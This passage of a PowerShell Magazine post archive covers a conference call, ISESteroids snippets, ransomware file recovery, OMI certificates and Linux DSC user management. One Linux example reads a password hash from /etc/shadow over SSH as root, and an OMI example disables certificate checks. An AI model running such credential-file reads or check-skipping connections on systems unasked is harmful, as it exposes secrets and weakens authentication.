To"],"title":"User Account Control and Admin Approval Mode – The impact on PowerShell"},{"categories":["News"],"contents":"Exciting times! On September 18-19 2015, we at the Singapore PowerShell User Group are planning to host the first PowerShell Conference Asia. This will be held at Microsoft Singapore. It will be a 2-day single track event (with breakout sessions) and we intend it to pave the way for larger events of this kind here in Asia. The organizing committee at the moment consists of Matt Hitchcock (PowerShell MVP), Milton Goh (PowerShell MVP), Benjamin Hodge (Singapore User Group Co-lead and Sydney lead) and Ravikanth Chaganti (PowerShell MVP).\nIn preparation, we are now looking for speakers and sponsors to help make this event happen.\nCall for Speakers The focus of this conference is PowerShell as a technology in its own right and we would prefer topics to be relevant to the core of PowerShell. It’s OK to submit topics like ‘Managing AD with PowerShell’ provided AD is more the bi-product to share transferable PowerShell knowledge. If the session is more product-related than PowerShell it will be a breakout topic from the main track. At the moment we would like to target the sessions at intermediate to slightly-advanced level, assuming that all attendees have foundation knowledge of PowerShell and scripting. We are interested in various topics so please submit and the most interesting ones will be selected.\nWe would love to have enthusiastic PowerShell people from all over Asia or indeed the world! You don’t have to be a PowerShell master, just love what you’re doing with PowerShell and want to share it with others. Speakers will receive free entry to the event, speaker T-shirt and will of course be coming to the Speakers Dinner and Closing Drinks. While we would love to be able to cover travel \u0026amp; accommodation, at the moment this is not within our plans. If budget allows, we may be able to subsidise hotels or provide couch-surfing arrangements with trusted hosts. However, at this time it is not guaranteed and would be best viewed as an investment in your own career (personal brand, networking, etc.) and to the PowerShell community. Please be prepared to plan and fund your own travel at this stage.\nCall for speakers and sponsors is open now and closes on 14th June 2015. Speakers will be told within 3 weeks of submission or by 30th June (whichever comes first) if their session is selected so get in there quick!\nPlease register using this Survey link: http://1drv.ms/1HB7ldu\nCall for Sponsors We are looking for sponsors with a vested interest in PowerShell or automation technology in general. If you have a PowerShell or PowerShell-compatible product, some relevant training or resources to share then we would love to have you as our sponsors. IT service providers and technology recruiters are equally as important and welcome to associate with us. We are expecting to have up to 100 attendees from Singapore and surrounding countries and hoping to encourage both IT Pros and developers and those with a DevOps interest. For sponsors we have the following packages available:\n1 x Platinum Sponsor Headlining sponsor with their name integrated into officially the event name/logo (i.e. PowerShell Forum brought to you by ABC Corp)\n Keynote speaking slot (content to be approved by us) Vendor booth Branding on the website, invitations, and even banners A place at lunchtime roundtable/panel event Invitation for one representative to the speakers dinner Two representatives to the event closing networking party  5 x Gold Sponsor   Vendor booth\n  Branding on the website, invitations and event banners\n  A place at lunchtime roundtable/panel event\n  Invitation for 2 representatives to event closing networking party\n  10 x Silver Sponsor  Branding on the website, invitations and event banners. Invitation for 2 representatives to event closing networking party.  Pricing for the packages will be available by April 20th. If there is something you would like in the sponsor packages that we don’t list here please drop matt@singaporepowershell.org an email and we can see if we can adjust to accommodate.\nPlease register your interest using this Survey link: http://1drv.ms/1JfBJvi\nIf you are considering coming to this event We thought it would be helpful to set out an example schedule for those who are considering travelling to Singapore for this event. Your trip might look like the following:\n   Day Plan     Thursday 17th Sept Arrive in Singapore: Sightseeing, event preparation, pre-event meet up   Friday 18th Sept Event Day 1: Potential hackathon/Scripting challengeSpeakers \u0026amp; Sponsors Dinner/Dinner with your newfound community friends   Saturday 19th Sept Event Day 2: Closing Dinner, Drinks and Networking at a favourite pub of ours with great music and views of the river   Sunday More sightseeing and heading home    If you have any questions please contact me on matt@singaporepowershell.org. I\u0026rsquo;ll redirect you to the right person until we get our contact channels properly defined. We are not-for-profit and are only collecting as much sponsorship money as we need to make this event happen. Details of our sponsorship package pricing will be announced soon and communicated to those who register an interest as soon as we can.\nThank you for considering participating in and supporting this event, we look forward to making this happen and bringing the PowerShell community in Asia \u0026amp; Australia together!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/04/06/powershell-conference-asia-2015-call-for-speakers-and-sponsors/","tags":["News","Conferences"],"title":"PowerShell Conference Asia, 2015 – call for speakers and sponsors"},{"categories":["Royal TS","Module Spotlight"],"contents":"Back in January 2015, I wrote an introduction to the new PowerShell module in Royal TS V3, which back then was available as a beta version.\nSince then, the final version of Royal TS V3 has released. I provided some feedback for improvements in the previous article, many of them are implemented in the final version:\n We have unified Get-RoyalObjects and Get-RoyalObject into one cmdlet We have added IntelliSense for some parameters with predefined value We have updated our help to be more complete and it is now available via Get-Help Additionally, we will have a look into getting the Royal TS PowerShell module into Chocolatey/OneGet and in the PowerShell Gallery.  The path to the Royal TS PowerShell module is not added to $env:PSModulePath yet, but I’m told they are looking into it.\nI’m also told that Royal TS V3 has been submitted to Chocolatey, but it’s not approved yet. That’s why we still see the previous version when using OneGet to find it:\nAs soon as it’s published you may install it using Install-Package –Name RoyalTS -MinimumVersion 3. Until then you can get it from the Royal TS downloads page.\nThe following cmdlets and parameters has been changed in the Royal TS PowerShell module between the beta and final version:\nGet-RoyalObject (!)\nFolder (+)\nName (+)\nObject (-)\nStore (+)\nType (+)\nGet-RoyalObjects (-)\n! \u0026gt; Changed\n+ \u0026gt; New\n– \u0026gt; Removed\nHere is an example of the IntelliSense, which has been added:\nI have also updated the script for creating Remote Desktop connections I published as part of my previous article, since there was a breaking change from the beta version. You can find the updated version here.\nIf you have ideas or suggestions for improvements, you may submit them on the Royal TS Support portal.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/03/24/royal-ts-v3-with-a-powershell-module-released/","tags":["Modules","Royal TS"],"title":"Royal TS V3 (with a PowerShell module) released"},{"categories":["Linux","OMI"],"contents":"When you install OMI for the first time, a pair of keys is generated for you. When an automated process is used, the only option that will “just work” is to generate self-signed certificate. The logical next step is to convince your machine that it should connect to OMI server even though it doesn\u0026rsquo;t really trust this certificate. Therefore most of examples that use CIM connection to OMI server you will find will look like this:\n$paramCimOption = @{ UseSsl = $true SkipCACheck = $true SkipCNCheck = $true SkipRevocationCheck = $true } $opt = New-CimSessionOption @paramCimOption $paramCimSession = @{ Credential = $cred ComputerName = \u0026#39;192.168.3.20\u0026#39; Authentication = \u0026#39;Basic\u0026#39; SessionOption = $opt } $demo1 = New-CimSession @paramCimSession Good for very basic demos but if you consider using OMI and/or Linux DSC in the production environment you shouldn\u0026rsquo;t depend on automatically generated, self-signed certificate. The whole point of communication over HTTPS is that both devices on each side of the wire know and trust each other. With self-signed certificates it becomes false-protection, a security not applied.\nIf you have internal PKI, it’s relatively straight-forward to create proper, domain-wide trusted certificate for any network device. Existence of the internal PKI should be a safe assumption: any organization that uses SSL and doesn\u0026rsquo;t have own PKI is either wasting money on 3rd-party certificates or is “doing it wrong” for any SSL-based application.\nFirst thing we have to do is to generate certificate request and private key on Linux machine. To achieve this we will use openssl command. To avoid prompts we will provide all parameters inline. To call commands on Linux we will use Posh-SSH module, described here:\n$ssh = New-SSHSession -ComputerName DSCTest.bielawscy.com -AcceptKey $true -Credential $root $command = -join @( \u0026#39;openssl req -new -newkey rsa:4096 -nodes\u0026#39;, \u0026#39; -subj \u0026#34;/C=PL/L=Koszalin/O=Bielawscy/CN=DSCTest.bielawscy.com\u0026#34;\u0026#39;, \u0026#39; -keyout omikey.pem -out omi.req -passout pass:s3cr3t!\u0026#39; ) Invoke-SSHCommand -SSHSession $ssh -Command $command | ForEach-Object Error Request file (omi.req) needs to be copied from Linux box to our Windows system. There are many methods to achieve this; we will use another part of Posh-SSH module, Get-SCPFile command. Just to be sure we are using correct file we will first remove any files with base name omi already present in the c:\\temp folder:\nRemove-Item -Path c:\\temp\\omi.* -ErrorAction SilentlyContinue $getFile = @{ ComputerName = \u0026#39;DSCTest.bielawscy.com\u0026#39; Credential = $root LocalFile = \u0026#39;c:\\temp\\omi.req\u0026#39; RemoteFile = \u0026#39;omi.req\u0026#39; } Get-SCPFile @getFile Next step requires communication with an internal CA. We will use traditional certreq.exe tool to perform this operation:\ncertreq -submit -attrib \u0026#34;CertificateTemplate:SSL\u0026#34; -config CA.bielawscy.com\\bielawscy-CA-CA c:\\temp\\omi.req c:\\temp\\omi.crt  The procedure to request/issue certificate may differ in your environment: in my case I had certificate template \u0026ldquo;SSL\u0026rdquo; available for me that suits the requirements of OMI certificate and I had necessary rights to get the final certificate immediately.\n Next step is to copy the certificate back to our OMI server. For that we will use Posh-SSH again, this time Set-SCPFile cmdlet to copy a local file to the remote system:\n$setFile = @{ ComputerName = \u0026#39;DSCTest.bielawscy.com\u0026#39; Credential = $root LocalFile = \u0026#39;c:\\temp\\omi.crt\u0026#39; RemoteFile = \u0026#39;omi.crt\u0026#39; } Set-SCPFile @setFile We have our certificate ready, but the file format does not match the one used for the private key. We need to convert it to the correct format using openssl command. With the both files ready we can copy existing files (just in case) to separate folder, replace certificate with the one we trust and restart OMI server:\n$commands = @( \u0026#39;openssl x509 -in omi.crt -out omi.pem -outform PEM\u0026#39;, \u0026#39;mkdir self-signed\u0026#39;, \u0026#39;cp /opt/omi-1.0.8/etc/ssl/certs/omi* self-signed/\u0026#39;, \u0026#39;cp ~/omi*.pem /opt/omi-1.0.8/etc/ssl/certs/\u0026#39;, \u0026#39;systemctl restart omi\u0026#39; ) foreach ($command in $commands) { $exit = Invoke-SSHCommand -SSHSession $ssh -Command $command if ($exit.ExitStatus -gt 0) { $exit.Error } }  The command used to restart OMI service depends on the tool that is used to control the services on the Linux box. In my case (CentOS 7) it was systemd/systemctl.\n Our OMI server is using a proper certificate, so we should be able to connect to it without any of the switches that we’ve used before to accept self-signed certificate. Once connected, we ask for instance of OMI_Identify, to make sure we are talking to the correct server:\n$paramCimSession = @{ ComputerName = \u0026#39;DSCTest.bielawscy.com\u0026#39; Credential = $root Authentication = \u0026#39;Basic\u0026#39; SessionOption = New-CimSessionOption -UseSsl } $cimSession = New-CimSession @paramCimSession Get-CimInstance -CimSession $cimSession -ClassName OMI_Identify -Namespace root\\OMI ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/03/23/omi-with-wsman-over-https-done-right/","tags":["Linux","OMI"],"title":"OMI with WSMan over HTTPS: Done right."},{"categories":["Module Spotlight"],"contents":"Should you frequently experience de-ja-vus while writing PowerShell code – \u0026ldquo;didn’t I type in this [function|loop|statement|you name it] before?\u0026rdquo;, \u0026ldquo;how did this darn syntax for [you name it] work again?\u0026rdquo; – now there may be a cure available with the latest release of ISESteroids. Grab it at www.powertheshell.com/ if you haven’t installed it already. Build 2.0.15.26 has been released just now.\nOne of the major enhancements in this release is an intelligent and hierarchical snippet system.\nCode snippets can help you insert pieces of code that you frequently need. To be really useful, snippets need to be rapidly available when you need them, and easily customizable.\nLet’s check out how snippets work in ISESteroids.\nSnippet Insertion While You Type Whenever you type code, ISESteroids monitors your input, and when it guesses that there might be a suitable snippet, your current word is colorized. When this occurs, simply press TAB to insert the snippet. Colorization is still limited to the editor, but the insertion works in the console, too.\nFor example, you might be typing a command like this:\nGet-Service\nNow you would like to do something with the results, so you want to add a Foreach-Object. While you type “for”, the word “for” gets a colored background. Once you press TAB, the statement is there – bang.\nTry the same with “if”, or “else”.\nObviously, ISESteroids can not read your mind, but it manages a list of keyboard shortcuts that are associated with code snippets. To see all shortcuts, try this:\nGet-SteroidsSnippetShortcut | Out-GridView\nScope Awareness: Getting the Snippet You Meant Of course, keyboard shortcuts are limited. For example, the shortcut “for” could be useful for inserting a “for” loop, but it could also be useful for inserting a “foreach-object” statement – depending on what you are currently doing.\nISESteroids can sense what you are doing by looking at your code context, and then decide. For example, a “for” loop won’t make sense in a pipeline, whereas “foreach-object” won’t make sense outside of a pipeline.\nThe snippet author can define in which scenarios a snippet is useful. This is implemented into the keyword selector:\nIf you type “for” in an empty line, you get a “for” loop. If you do the same in a pipeline, like in the previous example, you get the “foreach-object” cmdlet.\nIntelligent Snippet Adjustment Simple and static snippets are of great help, but often, the snippet code needs some adjustments. To rapidly get going, there are two types of snippets:\n Simple Snippets just insert some code, and then place the cursor to the position the snippet author defined. Inserting “Foreach-Object” is an example of such a simple snippet. Advanced Snippets start a special “Adjustment Mode” once inserted. All parts of the inserted code that might need adjustments are highlighted. You can press TAB to move from one selection to another. The status bar tells you what kind of code change is expected from you. When you change variables, all dependent variables also change. And once you press ENTER, the finalized snippet is inserted (you can also press ESC to cancel). Inserting a “for” loop would be an example for an advanced snippet.  To check out an advanced snippet, do this:\n Open the snippet selector by pressing CTRL+J Type in “for” to quickly find the “Basic “For” Loop” snippet, and press ENTER to insert The snippet code gets inserted, and the status bar prompts you “Change iteration variable name”. Press TAB to move to the next selection. The status bar now reads “Change start value”. Continue and adjust the snippet, then press ENTER. Done.  Note: one thing you should currently not do is press CTRL+Z (Undo) while in insertion mode. Always make sure you complete the process by either pressing ENTER or ESC. Else, the insertion mode may not be cancelled.\nMore Choices with Hierarchical Snippet Selector Keyboard shortcuts are great when there is just one snippet for a task. To manage a wealth of snippets, ISESteroids replaces the simple one-dimensional snippet selector built into ISE, with a more sophisticated hierarchical snippet selector. You can open it both in the editor and in the console by pressing CTRL+J, like in the previous example.\nIt presents available snippets in a tree-like style, and you can navigate the selector solely by keyboard, or with mouse clicks. The selector is highly optimized, which is why you will probably need a little walkthrough to exploit all of its capabilities:\n When you type text BEFORE you press CTRL+J, the text adjacent to the left of your cursor is taken as filter. Only snippets that match this word will be displayed. When you type text AFTER you opened the snippet selector, your text input will do two things: it selects the available entries, and it also searches for keyboard shortcuts, displaying matching snippets immediately in your treeview. When you press BACKSPACE, you go back one level. When you hover over a snippet, you see a code preview. On top, you find a link to the actual snippet file, and clicking the link opens Windows Explorer and shows the file. In the bottom area, you find links to load the snippet into the snippet editor, to make adjustments. When you open the snippet selector in the editor, and you are not using the “Beginners UI” (menu “Level”), select “New Folder” to create a new hierarchical folder in your snippet tree. Select “New Snippet” to create a new snippet right at that location. Hang on for details on snippet creation in a second.  Note that the snippet selector, too, is scope-aware. It will show you different snippets, depending on where you are in your code.\nInsertion Mode Often, the need arises to enclose existing code into some structure. Maybe you want to place some code into a block comment, or into a region. Or you decide that some code should really be inside a function, or inside a scriptblock, loop, you-name-it.\nTo enclose existing code by a snippet, select the code, then press CTRL+J to open the snippet selector.\nIt now only shows snippets that are suitable for enclosure. Pick one, and your selected code is automatically incorporated into the snippet. Here is an example:\n Type some code, multiple lines Select it Press CTRL+J Type “Region”, or click your way to the “Simple region” snippet, and press ENTER Your code is embraced by a collapsible region, and you are asked to give a name to that region. Press ENTER to complete the snippet insertion, or press ESC to abort.  By enclosing code into such a region, it becomes collapsible, and you can use the collapse buttons on the secondary ISESteroids toolbar to collapse and expand them, giving you a much better overview of your script document and logical structure.\nCreating Snippets ISESteroids makes it easy to create powerful snippets in just a couple of steps. So whenever you find yourself typing in the same code, consider making it a snippet. And share your snippets with others – after all, snippets are just files.\nHere are your options to create a new snippet:\n Select the code you want to turn into a snippet, right-click the selection, and choose “Create Code Snippet From Selection” Open the snippet selector by pressing CTRL+J, navigate to where you want to create your snippet, and choose “New Snippet” (only available in the editor snippet selector, not in the console snippet selector).  This opens the completely redesigned snippet editor.\nIt first wants to know where you want to save your snippet. A dropdown list offers all snippet locations that ISE is aware of: all folders from where ISE has imported snippets, and where you have write permission. So if you want to add more locations to this list, simply make sure you imported snippets from that location before.\nNext, if you create the snippet from a selection, pick the place in the snippet tree where you want your snippet to be located. This step is skipped when you open the snippet editor from the selection tree, because here you already defined where to create the snippet.\nFinally choose a file name (without extension). Now you are good to go.\nIn the top area of the snippet editor, make sure you enter a meaningful header and description. Both appear later in the snippet selector, and help people find your snippet.\nIn the top right corner, define the difficulty level and special requirements. ISESteroids will limit snippets to desired difficulty level and met requirements in the future. To help you choose an appropriate difficulty level, the tooltips define what a user should know about PowerShell for any given difficulty level.\nTo see the impact that a difficulty level has, you may want to switch the user interface to “Beginner”: choose “Level/Beginner”. The user interface will turn into a very simplistic starter interface, and the difficulty level is reduced. So when you now open the snippet selector via CTRL+J, you will see a lot less snippets. Snippets dealing with advanced topics that are likely to confuse a beginner, are now excluded.\nMost importantly, in the right column, assign a keyboard shortcut to your snippet if you want it to be rapidly insertable.\nDefining Shortcut Scope Below the keyboard shortcut, in the right column, select the scope in which your snippet makes sense:\n Editor: anywhere in the editor pane Console: anywhere in the console pane ScriptBlock: anywhere in a scriptblock, but not in a pipeline, parameter block, comment, or attribute definition ParamBlock: only inside a param() statement Attribute: only inside an attribute definition Pipeline: only within a pipeline Comment: only inside of comments  If you do not check anything, the snippet will be insertable anywhere.\nCreate Simple and Advanced Snippets You can now adjust your code in the code editor pane. To define where the cursor should be placed after the snippet gets inserted, right-click the desired position, then choose “Set Desired Final Caret Position”.\nTo turn your simple snippet into an advanced snippet, optionally start defining user-adjustable input areas:\n Select code that a user should be customizing Right-click the selection, and choose “New Input Area” Define tooltip and statusbar text. Note that currently tooltip text is not showing up in the UI but will in the future. If you want your snippet to be able to “enclose” selected text (as described earlier), check “Enclose Selection Text”. There can always only be one input area that takes selected text.  At the bottom, you see a checkbox “This is example code”. When checked, the snippet is marked as example code. In the future, ISESteroids will separate examples from snippets, but for now this has no effect on snippet insertion.\nOnce you are done creating your, click Save, then Close. Your snippet is ready for action.\nIt immediately appears in the snippet selector once you press CTRL+J, and if you assigned a keyboard shortcut, you can now enter the keyboard shortcut and see your shortcut word turn color. Press TAB to rapidly insert.\nIf you feel you want to edit your snippet again, press CTRL+J, navigate to your snippet, hover over it to open the code preview tooltip, and click “Edit Snippet” in the bottom area of the tooltip.\nUsing Snippets as Library The filtering mechanism built into the snippet selector makes it a great lookup tool for any code samples.\nLet’s say you found this piece of code, and turned it into a simple snippet:\n[Environment]::Is64BitOperatingSystem\nWhen you later type:\n[Environ\nand press CTRL+J now, you will see all your code snippets that start with this .NET class, organizing all of your samples neatly in one view.\nSince the snippet selector takes the filter word only left of the caret, auto-completed matching brackets are not getting into the way.\nWhat Else? The team added many more features in this release, not just snippet support.\nFor example, you may have noticed the new icons in the navigation bar. When you click the “New” icon (left side, looks like a star), a new function body is inserted. When you right-click the icon, a context menu lists all snippets that define function bodies, so you can quickly start new functions from snippets. And when you hold CTRL while you click a function snippet in the context menu, it becomes your default function snippet and will now be inserted when you left-click the icon.\nAlso, make sure you test-drive the all-new “From Syntax…” code generator in the same context menu. It takes valid PowerShell command syntax, and auto-generates the function body and parameter definitions for you.\nOnce you created a function, check out the icons in the right area of the navigation bar. They let you export one or more functions to a PowerShell module, completing the code generation life-cycle.\nThe best way to explore new features until documentation is available, is to visit the version history page: http://www.powertheshell.com/isesteroids2/isesteroids-version-history/\nIntroductory Offer Ends Soon The ISESteroids team has been working for almost half a year now on finalizing ISESteroids 2.0, taking your input and suggestions, and adding a wealth of productivity features. ISESteroids development has taken a total of two full years, and the result is finally a Visual Studio-like development environment specifically tailored to the needs of PowerShell scripters.\nIt not just adds features you may be used from Visual Studio, but contains tons of innovative new features. For example, double-click a word to select it, then press CTRL+F. ISESteroids now highlights all instances of this word, and moves focus to the instant search box – unless you chose to hide the navigation bar, in which case you get the default find-and-replace dialog. To toggle the navigation bar, press ALT+N, or click the navigation button in the toolbar.\nPress F3 or ENTER to navigate to the next instance.\nTo replace text, press F2, then type some text.\nOr press the all-new CTRL+F3 to switch to “FocusView”: the editor now only displays lines with a search match. CTRL+F3 toggles FocusView, and FocusView gets turned off automatically once you edit your script.\nOr click a variable, and press F2. This highlights not just all sibling variables, but also related code that would also be affected by a rename. Type a new name to rename all variables in your script.\nThere is so much more. F12 toggles distraction free viewing mode. CTRL+F7 toggles bookmarks, and F7 jumps to the next bookmark. This works across all open documents. The next ISESteroids team milestone is to get the documentation done and make all of these features more discoverable to you.\nHere is the official announcement: the final ISESteroids 2.0 version will be available April 22, 2015, and presented at the 3rd German PowerShell Konferenz in the Philharmony in Essen.\nISESteroids 2.0 will then be available in two flavors:\n ISESteroids 2.0 Professional: Includes all features from ISESteroids 1.0 plus many more. Same price as ISESteroids 1.0: EUR 99 plus tax. ISESteroids 2.0 Enterprise: all features, including advanced debugging, analytical tools, security enhancements. EUR 189 plus tax.  Both versions come with unlimited free updates for ISESteroids 2.0.\nThe trial version at www.powertheshell.com has the full Enterprise feature set. In the main menu, you can always choose “Level”, then “ISESteroids Professional Trial”, to set the UI and functionality level to “ISESteroids 2.0 Professional”, then test-drive that version, and see which one suits your needs.\nOr, you can still take advantage of the introductory offer, and get the full features for the lower price: Until April 22, 2015, any sold ISESteroids 1.0 license will automatically and free of charge upgrade to ISESteroids 2.0 Enterprise.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/03/14/rapid-powershell-development-with-isesteroids/","tags":["Modules"],"title":"Rapid PowerShell Development with ISESteroids"},{"categories":["How To"],"contents":"We’re now kicking off a new series on PowerShell Magazine called “How PowerShell saved the day”, where the intent is to share success stories where PowerShell was a major factor when solving a problem.\nMy story is about a file cluster, which was modified by a virus that encrypted files due to a user opening an e-mail attachment. Of course there was a virus-protection in place both on the e-mail server, the client computer, and the file servers, but the virus definition files didn\u0026rsquo;t include this specific virus yet.\nShortly after the incident was reported, we gathered some facts:\n The file types encrypted were Microsoft Office documents (typically .docx and .xlsx) The encrypted documents was renamed with the original filename + a 7 digit random extension, such as Report.docx.dwqskfj  The encrypted files was quickly identified using regular PowerShell filtering:\ndir \u0026#39;\\\\domain.local\\Public\u0026#39; -Filter \u0026#34;*dwqskfj\u0026#34; -Recurse -File | Select-Object -Property name,directory,fullname | Export-Csv -Path C:\\temp\\infected.csv -NoTypeInformation -Encoding Unicode -Delimiter \u0026#39;;\u0026#39; At this point we didn’t know whether more files than those we had identified were encrypted, so we looked for other files with an extension greater than 4 with a high count:\ndir \u0026#39;\\\\domain.local\\Public\u0026#39; -Recurse -File | Where-Object {$_.Extension.Length -gt 4} | Group-Object -Property extension | sort count -Descending Most files returned from the results were verified as normal files, but we did identify one more file extension which was identified as encrypted files. When contacting the user who owned these files, the user acknowledged having opened a similar e-mail attachment as well.\nNow that the files were identified (about 5-6000), the next task was to recover them. Restoring such a large number of files manually was not an option. Restoring all files back to the last recovery point was not desired either since that would mean a lot of work users had performed that day would get lost.\nRestoring the entire file cluster data to an alternate location in order to script the recovery of the encrypted files from there would work, but that would be too time consuming when there was many TBs of data.\nLuckily, the backup software being used–Microsoft System Center DPM–has full PowerShell support. Creating a PowerShell script to perform the recovery was an affordable task, which was completed against a number of test-files in a reasonable amount of time:\nThis script is also available on GitHub.\nNote that there is room for improvement in this script. But the point in this case is that you can get the job done in an efficient manner when “your hair is on fire”. Improving the script with things such as removing aliases, adding error handling, logging and so on is something that can be added later in order to reuse it in case of a similar event.\nThe restore operation was fully completed after a few hours and the encrypted files was moved off to a temporary location until the recovery operation was verified to be 100% successful.\nIf you have a story to share on how PowerShell saved your day, please submit an article pitch to us.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/03/10/how-powershell-saved-the-day-jan-egil-ring/","tags":["How To"],"title":"How PowerShell saved the day – Jan Egil Ring"},{"categories":["PowerShell DSC"],"contents":"KB3000850, the November 2014 update rollup for Windows RT 8.1, Windows 8.1, and Windows Server 2012 R2, has brought several enhancements and fixes to the first version of DSC (initially released as a part of Windows PowerShell 4.0 in Windows Management Framework (WMF) 4.0).\nNew cmdlets and functions Several cmdlets and functions available in the latest WMF 5.0 Preview are now available in the updated WMF 4.0 as well. In the following image the output of Get-Command -Module PSDesiredStateConfiguration from computers running WMF 4.0 both with and without KB3000850 is stored in two variables which are compared using Compare-Object to see the differences:\nRemove-DscConfigurationDocument – There are configuration documents for various stages in DSC (current.mof, pending.mof, and previous.mof) stored in C:\\Windows\\System32\\Configuration. It can happen that a need to remove one or more of these files arise, for example if a document is corrupted for some reason. It is now possible to use the new Remove-DscConfigurationDocument function to perform this task:\nStop-DscConfiguration – If a consistency check was running longer than expected, there wasn’t an easy way to stop the process before this command became available. As the name indicates, it can stop a running configuration.\nUpdate-DscConfiguration – Triggers a pull request from a pull server, and thus only works for pull mode. If a new configuration is available, both the configuration and any dependent DSC Resources will be downloaded and applied. There are also several parameters available for this cmdlet worth looking up in the help system, such as –Wait and –Force.\nUpdates to existing cmdlets and functions Using Shay Levy’s script listed in this article, we can quickly see what cmdlets/functions and parameters are added, removed, or changed by KB3000850:\n! \u0026gt; Changed\n*\u0026gt; New\n– \u0026gt; Removed\nNew-DSCCheckSum (!)\nConfirm (+)\nWhatIf (+)\nStart-DscConfiguration (!)\nUseExisting (+)\nRemove-DscConfigurationDocument (+)\nStop-DscConfiguration (+)\nUpdate-DscConfiguration (+)\nImprovements to existing cmdlets and functions\nNew-DSCCheckSum – Previously, there was a bug causing this function to fail when specifying an UNC path to the -OutPath parameter. This is now fixed.\nGet-DscResource – Previously, this function was very slow to enumerate the available DSC resources. This is now fixed.\nGet-DscLocalConfigurationManager – This function now shows more information; among the new properties shown is the LCMState which displays the current state of the DSC engine.\nWMF 4.0 without KB3000850:\nWMF 4.0 with KB3000850:\nStart-DscConfiguration – Previously the –Force parameter didn\u0026rsquo;t always work correctly, this is now fixed.\nThere is also a new parameter, -UseExisting, which will apply the configuration document already present in the configuration store.\nPreviously there wasn`t any cmdlet available to trigger a consistency check, we had to manually start the scheduled task “Consistency” or invoke the appropriate CIM method.\nNow the -UseExisting parameter let us perform this task in a more convenient way.\nTest-DscConfiguration – Previously, this function returned only True or False, making it hard to know what computer is referenced when running against multiple remote computers. It now returns the computer name as a value of the PSComputerName property.\nWMF 4.0 without KB3000850:\nWMF 4.0 with KB3000850:\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/03/09/improvements-to-dsc-v1/","tags":["PowerShell DSC"],"title":"Improvements to DSC v1"},{"categories":["PowerShell DSC","OMI","Linux"],"contents":"Managing Linux can become a challenge if you don’t have some way of distributing credentials. There are several options: joining Active Directory domain and using shared credentials for both Linux and Windows, using other LDAP implementation to authenticate or distribute users/groups using Configuration Management tools. In the final part of Linux DSC series we will take a look at last two resources – nxUser and nxGroup – that should help us manage user and groups on Linux systems. We will also take a look at few debugging techniques that should help you identify a reason why given configuration fails.\nAdding a user on a Linux with nxUser resource is relatively simple task. It’s usually enough to specify username, password, and a home folder. The password is a tricky part: we have to provide it in salted hash form. I couldn’t find any reasonable solution for Windows to create such hashes, so I ended up creating a simple script on the Linux box that would generate the salted hash of selected password for me:\n#!/usr/bin/python from crypt import crypt from optparse import OptionParser parser = OptionParser( description=\u0026#39;Creates salted hash using specified plain-text password and salt\u0026#39; ) parser.add_option( \u0026#39;-p\u0026#39;, \u0026#39;--password\u0026#39;, help = \u0026#39;Plain text password\u0026#39; ) parser.add_option( \u0026#39;-s\u0026#39;, \u0026#39;--salt\u0026#39;, help = \u0026#39;Salt that will be used\u0026#39;, default = \u0026#39;PowerShellMag\u0026#39; ) (options, args) = parser.parse_args() if not options.password: parser.error(\u0026#39;Password is required!\u0026#39;) print crypt( options.password, \u0026#34;$6$%s$\u0026#34; % options.salt ) There are at least few methods to copy this file over to Linux box: scp, sftp, or even nxFile resource. Once the script is there, we can call it. Again: there are few options available. I decided to use Posh-Ssh module described in PowerShell Magazine a while ago:\n$linuxSession = New-SSHSession -ComputerName 192.168.200.104 -Credential $bielawbCred -AcceptKey $true $salt = Invoke-SSHCommand -SSHSession $linuxSession -Command \u0026#39;bin/passgen.py -p P@ssw0rd\u0026#39; | ForEach-Object { $_.Output -replace \u0026#34;`n\u0026#34; } Our configuration should take at least two parameters: name of the computer and a salted hash, which we will generate at runtime. Of course, we would have to change salt or we will get the same salted hash every time. Configuration that would create Web Admin account on target node:\nconfiguration LinuxUser { param ( [String]$ComputerName, [String]$PasswordSalt ) Import-DscResource -ModuleName nx node $ComputerName { nxUser WebAdmin { Ensure = \u0026#39;Present\u0026#39; UserName = \u0026#39;webadmin\u0026#39; FullName = \u0026#39;Web Admin\u0026#39; Password = $PasswordSalt } } } In this case we have used nxUser to create a user, but nothing prevents us from updating users using the same resource. For example, we may want to update password for a user using content of /etc/shadow on the reference machine. First we need to run SSH command as the root to read hash for a given user:\n$rootSession = New-SSHSession -ComputerName 192.168.200.104 -Credential $root -AcceptKey $true $salt = Invoke-SSHCommand -SSHSession $rootSession -Command \u0026#39;grep bielawb /etc/shadow | cut -d: -f2\u0026#39; | ForEach-Object { $_.Output -replace \u0026#34;`n\u0026#34; } Next, we add nxUser to our configuration script. In this case we need a few parameters: name of the node, name of the user, and user’s password:\nconfiguration UpdatePassword { param ( [String]$ComputerName, [String]$UserName, [String]$PasswordSalt ) Import-DscResource -ModuleName nx # (...) node $ComputerName { nxUser \u0026#34;$UserName-Update\u0026#34; { UserName = $UserName Password = $PasswordSalt } } } As a final step we have to apply the configuration to selected nodes. After this is done we can use the same password on all nodes where this configuration was applied.\nCreating a user is only part of the picture. The group membership is usually more important as it is used to grant users certain rights on the Linux box. With nxGroup resource we can create groups, specify group members, request preferred group ID, and select users that should be added or removed from a given group. Example configuration that creates group web with bielawb and webadmin as a members and makes sure that bielawb is a member of the group wheel but not group apache and at the same time webadmin is a member of the group apache but not a member of the group wheel:\nconfiguration LinuxGroup { param ( [String]$ComputerName ) Import-DscResource -ModuleName nx node $ComputerName { nxUser WebAdmin { Ensure = \u0026#39;Present\u0026#39; UserName = \u0026#39;webadmin\u0026#39; } nxGroup WebAdmins { Ensure = \u0026#39;Present\u0026#39; GroupName = \u0026#39;web\u0026#39; Members = \u0026#39;bielawb\u0026#39;, \u0026#39;webadmin\u0026#39; DependsOn = \u0026#39;[nxUser]WebAdmin\u0026#39; } nxGroup Apache { GroupName = \u0026#39;apache\u0026#39; MembersToInclude = \u0026#39;webadmin\u0026#39; MembersToExclude = \u0026#39;bielawb\u0026#39; DependsOn = \u0026#39;[nxUser]WebAdmin\u0026#39; } nxGroup Wheel { GroupName = \u0026#39;wheel\u0026#39; MembersToInclude = 